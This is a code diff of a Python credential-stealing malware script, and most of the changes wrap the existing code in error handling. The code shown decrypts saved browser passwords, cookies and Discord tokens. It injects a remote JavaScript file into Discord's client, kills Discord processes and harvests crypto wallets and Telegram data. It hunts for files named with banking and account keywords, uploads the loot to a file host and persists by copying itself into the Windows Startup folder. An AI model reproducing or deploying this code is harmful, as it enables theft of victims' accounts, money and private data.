@@ -51,15 +51,17 @@ import sys
 import shutil
 import socket
 import ssl
+import requests
+from Crypto.Cipher import AES
 
+try:
+ ssl._create_default_https_context = ssl._create_unverified_context
 
-ssl._create_default_https_context = ssl._create_unverified_context
-
-inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+ inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
     
-DETECTED = False
+ DETECTED = False
 
-def g3t1p():
+ def g3t1p():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
@@ -67,31 +69,28 @@ def g3t1p():
         pass
     return ip
 
-requirements = [
+ requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"],
-]
-for modl in requirements:
+ ]
+ for modl in requirements:
     try: __import__(modl[0])
     except:
         subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
 
-import requests
-from Crypto.Cipher import AES
+ local = os.getenv('LOCALAPPDATA')
+ roaming = os.getenv('APPDATA')
+ temp = os.getenv("TEMP")
+ Threadlist = []
 
-local = os.getenv('LOCALAPPDATA')
-roaming = os.getenv('APPDATA')
-temp = os.getenv("TEMP")
-Threadlist = []
-
-class DATA_BLOB(Structure):
+ class DATA_BLOB(Structure):
     _fields_ = [
         ('cbData', wintypes.DWORD),
         ('pbData', POINTER(c_char))
     ]
 
-def G3tD4t4(blob_out):
+ def G3tD4t4(blob_out):
     cbData = int(blob_out.cbData)
     pbData = blob_out.pbData
     buffer = c_buffer(cbData)
@@ -99,7 +98,7 @@ def G3tD4t4(blob_out):
     windll.kernel32.LocalFree(pbData)
     return buffer.raw
 
-def CryptUnprotectData(encrypted_bytes, entropy=b''):
+ def CryptUnprotectData(encrypted_bytes, entropy=b''):
     buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
     buffer_entropy = c_buffer(entropy, len(entropy))
     blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
@@ -109,7 +108,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return G3tD4t4(blob_out)
 
-def D3kryptV4lU3(buff, master_key=None):
+ def D3kryptV4lU3(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
     if starts == 'v10' or starts == 'v11':
         iv = buff[3:15]
@@ -119,7 +118,7 @@ def D3kryptV4lU3(buff, master_key=None):
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
 
-def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
+ def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
     for i in range(8): 
         try:
             if methode == 'POST':
@@ -134,7 +133,7 @@ def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
         except:
             pass
 
-def TR6st(C00k13):
+ def TR6st(C00k13):
     
     global DETECTED
     data = str(C00k13)
@@ -147,15 +146,15 @@ def TR6st(C00k13):
         DETECTED = False
         return DETECTED
     
-process_list = os.popen('tasklist').readlines()
+ process_list = os.popen('tasklist').readlines()
 
-for process in process_list:
+ for process in process_list:
     if "Discord" in process:
         
         pid = int(process.split()[1])
         os.system(f"taskkill /F /PID {pid}")
 
-def G3tb1ll1ng(t0k3n):
+ def G3tb1ll1ng(t0k3n):
     headers = {
         "Authorization": t0k3n,
         "Content-Type": "application/json",
@@ -178,7 +177,7 @@ def G3tb1ll1ng(t0k3n):
 
     return b1ll1ng
 
-def inj_discord():
+ def inj_discord():
 
     folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
 
@@ -202,36 +201,40 @@ def inj_discord():
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj_content)
-inj_discord()
+ inj_discord()
 
 
-def G3tT0k4n1nf9(t0k3n):
-    headers = {
+ def G3tT0k4n1nf9(t0k3n):
+    try:
+     headers = {
         "Authorization": t0k3n,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
+     }
+    
+     us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
+     username_token = us3rjs0n["username"]
+     hashtag_token = us3rjs0n["discriminator"]
+     email_token = us3rjs0n["email"]
+     id_token = us3rjs0n["id"]
+     pfp_token = us3rjs0n["avatar"]
+     flags_token = us3rjs0n["public_flags"]
+     nitro_token = ""
+     phone_token = ""
+    
 
-    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
-    username_token = us3rjs0n["username"]
-    hashtag_token = us3rjs0n["discriminator"]
-    email_token = us3rjs0n["email"]
-    id_token = us3rjs0n["id"]
-    pfp_token = us3rjs0n["avatar"]
-    flags_token = us3rjs0n["public_flags"]
-    nitro_token = ""
-    phone_token = ""
-
-    if "premium_type" in us3rjs0n: 
+     if "premium_type" in us3rjs0n: 
         nitrot = us3rjs0n["premium_type"]
         if nitrot == 1:
             nitro_token = "Nitro"
         elif nitrot == 2:
             nitro_token = "Nitro Boosts"
-    if "phone" in us3rjs0n: ph0n3 = f'{us3rjs0n["phone"]}'
+     if "phone" in us3rjs0n: ph0n3 = f'{us3rjs0n["phone"]}'
+    except:
+     us3rjs0n, username_token, hashtag_token, email_token, id_token, pfp_token, flags_token, nitro_token, phone_token = "N/A"
     return username_token, hashtag_token, email_token, id_token, pfp_token, flags_token, nitro_token, phone_token
 
-def ch1ckT4k1n(t0k3n):
+ def ch1ckT4k1n(t0k3n):
     headers = {
         "Authorization": t0k3n,
         "Content-Type": "application/json",
@@ -243,29 +246,29 @@ def ch1ckT4k1n(t0k3n):
     except:
         return False
 
-if getattr(sys, 'frozen', False):
+ if getattr(sys, 'frozen', False):
     currentFilePath = os.path.dirname(sys.executable)
-else:
+ else:
     currentFilePath = os.path.dirname(os.path.abspath(__file__))
 
-fileName = os.path.basename(sys.argv[0])
-filePath = os.path.join(currentFilePath, fileName)
+ fileName = os.path.basename(sys.argv[0])
+ filePath = os.path.join(currentFilePath, fileName)
 
-startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-startupFilePath = os.path.join(startupFolderPath, fileName)
+ startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+ startupFilePath = os.path.join(startupFolderPath, fileName)
 
-if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
+ if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
     with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
         shutil.copyfileobj(src_file, dst_file)
 
-def R4f0rm3t(listt):
+ def R4f0rm3t(listt):
     e = re.findall("(\w+[a-z])",listt)
     while "https" in e: e.remove("https")
     while "com" in e: e.remove("com")
     while "net" in e: e.remove("net")
     return list(set(e))
 
-def upl05dT4k31(t0k3n, path):
+ def upl05dT4k31(t0k3n, path):
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -279,8 +282,8 @@ def upl05dT4k31(t0k3n, path):
 
     return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3
 
-T0k3ns = ''
-def getT0k3n(path, arg):
+ T0k3ns = ''
+ def getT0k3n(path, arg):
     if not os.path.exists(path): return
 
     path += arg
@@ -296,8 +299,8 @@ def getT0k3n(path, arg):
                                 T0k3ns += t0k3n
                                 upl05dT4k31(t0k3n, path)
 
-P4ssw = []
-def getP4ssw(path, arg):
+ P4ssw = []
+ def getP4ssw(path, arg):
     global P4ssw, P4sswCount
     if not os.path.exists(path): return
 
@@ -333,7 +336,7 @@ def getP4ssw(path, arg):
             P4sswCount += 1
 
 
-def G3tD1sc0rd(path, arg):
+ def G3tD1sc0rd(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
 
     pathC = path + arg
@@ -359,7 +362,7 @@ def G3tD1sc0rd(path, arg):
                             upl05dT4k31(t0k3nDecoded, path)
 
 
-def ZipTelegram(path, arg, procc):
+ def ZipTelegram(path, arg, procc):
     global OtherZip
     pathC = path
     name = arg
@@ -377,7 +380,7 @@ def ZipTelegram(path, arg, procc):
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
 
-def Z1pTh1ngs(path, arg, procc):
+ def Z1pTh1ngs(path, arg, procc):
     pathC = path
     name = arg
     global WalletsZip, GamingZip, OtherZip
@@ -456,7 +459,7 @@ def Z1pTh1ngs(path, arg, procc):
         OtherZip.append([name, lnik])
 
 
-def GatherAll():
+ def GatherAll():
     '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
     browserPaths = [
         [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
@@ -512,13 +515,16 @@ def GatherAll():
     global upths
     upths = []
 
-def uploadToAnonfiles(path):
+ def uploadToAnonfiles(path):
+   try:
     try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
     except:return False
+   except:
+       ()
 
 
 
-def KiwiFolder(pathF, keywords):
+ def KiwiFolder(pathF, keywords):
     global KiwiFiles
     maxfilesperdir = 7
     i = 0
@@ -534,8 +540,9 @@ def KiwiFolder(pathF, keywords):
             break
     KiwiFiles.append(["folder", pathF + "/", ffound])
 
-KiwiFiles = []
-def KiwiFile(path, keywords):
+ KiwiFiles = []
+ def KiwiFile(path, keywords):
+  try:
     global KiwiFiles
     fifound = []
     listOfFile = os.listdir(path)
@@ -551,8 +558,11 @@ def KiwiFile(path, keywords):
                     break
 
     KiwiFiles.append(["folder", path, fifound])
+  except:
+     ()
 
-def Kiwi():
+ def Kiwi():
+  try:
     user = temp.split("\AppData")[0]
     path2search = [
         user + "/Desktop",
@@ -621,47 +631,55 @@ def Kiwi():
         kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
         wikith.append(kiwi)
     return wikith
+  except:
+     ()
 
-global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip
+ global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip
 
-keyword = [
+ keyword = [
     'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
-]
+ ]
 
-CookiCount, P4sswCount = 0, 0
-cookiWords = []
-paswWords = []
+ CookiCount, P4sswCount = 0, 0
+ cookiWords = []
+ paswWords = []
 
-WalletsZip = [] 
-GamingZip = []
-OtherZip = []
+ WalletsZip = [] 
+ GamingZip = []
+ OtherZip = []
 
-Account = P4sswCount
-GatherAll()
+ Account = P4sswCount
+ GatherAll()
 
-account = P4ssw
-account_number = P4sswCount
+ account = P4ssw
+ account_number = P4sswCount
+ 
+ 
 #Recuperation des infos du token
 
-headers = {
+ headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-username_token, hashtag_token, email_token, id_token, pfp_token, flags_token, nitro_token, phone_token = G3tT0k4n1nf9(T0k3ns)
-
-if nitro_token in ['', ' ', '  ', '   ', '0', 'none']:
+ username_token, hashtag_token, email_token, id_token, pfp_token, flags_token, nitro_token, phone_token = G3tT0k4n1nf9(T0k3ns)
+ 
+ if nitro_token in ['', ' ', '  ', '   ', '0', 'none']:
    nitro_token = "N/A"
-if hashtag_token in ['0', '', 'none', ' ']:
-   hashtag_token = "N/A"
-if pfp_token == None: 
+ if hashtag_token in ['0', '', 'none', ' ']:
+   hashtag_token = "N/A"  
+ if pfp_token == None: 
         pfp_token = "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless"
-else:
+ else:
         pfp_token = f"https://cdn.discordapp.com/avatars/{id_token}/{pfp_token}"
-
+except:
+ username_token, hashtag_token, email_token, id_token, flags_token, nitro_token, phone_token, T0k3ns = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", 
+pfp_token = "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless"
 token = T0k3ns
+
+
 #Recuperation du nom du pc
 try:
- nom_pc = socket.gethostname()
+  nom_pc = socket.gethostname()
 except:
  nom_pc = "N/A"
 
@@ -860,10 +878,7 @@ Main Screen  : "No"
  else:
    second_ecran = 'N/A'
 except:
- second_ecran = "N/A"
-
-
-''')
+ second_ecran = "N/A"''')
  fichier.write(f'''
 webhook_invit = '{webhook}'
 ''')
@@ -973,7 +988,7 @@ Nitro    : {nitro_token}
 Email    : {email_token}
 Token    : {token}```""", "inline": False},
 
-{"name": f"Webhook Use:", "value": f"""```{webhook_invit}```""", "inline": False},
+{"name": f":link: | Webhook Use:", "value": f"""```{webhook_invit}```""", "inline": False},
 #{"name": f"", "value": f"""```{}```""", "inline": False},
 ] 
 
